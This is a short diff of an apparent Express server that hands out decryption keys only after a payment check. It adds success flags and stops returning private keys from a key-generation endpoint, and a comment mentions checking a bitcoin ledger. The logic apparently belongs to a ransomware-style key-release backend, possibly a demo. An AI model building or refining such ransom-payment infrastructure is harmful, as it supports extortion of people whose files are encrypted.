@@ -47,6 +47,7 @@ app.post('/check-payment', async (req, res) => {
 
     if (paid) {
         const priv_key = keys[pub_key];
+        
 
         // Decrypt private key
         const request = await axios.post(decrypter_url, {
@@ -55,10 +56,10 @@ app.post('/check-payment', async (req, res) => {
 
         const decrypted = request.data.privateKey;
 
-        return res.status(200).json({ key: decrypted});
+        return res.status(200).json({ success: "true", key: decrypted});
     }
 
-    return res.status(400).json({ msg: "Not Paid"});
+    return res.status(400).json({ success: "false", msg: "Not Paid"});
 });
 
 // Post request for testing purposes, irl would use bitcoin ledger to check
@@ -107,7 +108,7 @@ app.get('/gen-key', (req, res) => {
     keys[publicKey] = secret_priv.toString('base64');
 
     // send back public key
-    res.status(200).json({pub: publicKey, pkey: privateKey.toString()});
+    res.status(200).json({pub_key: publicKey});
 
     // increments key count
     key_count+=1;
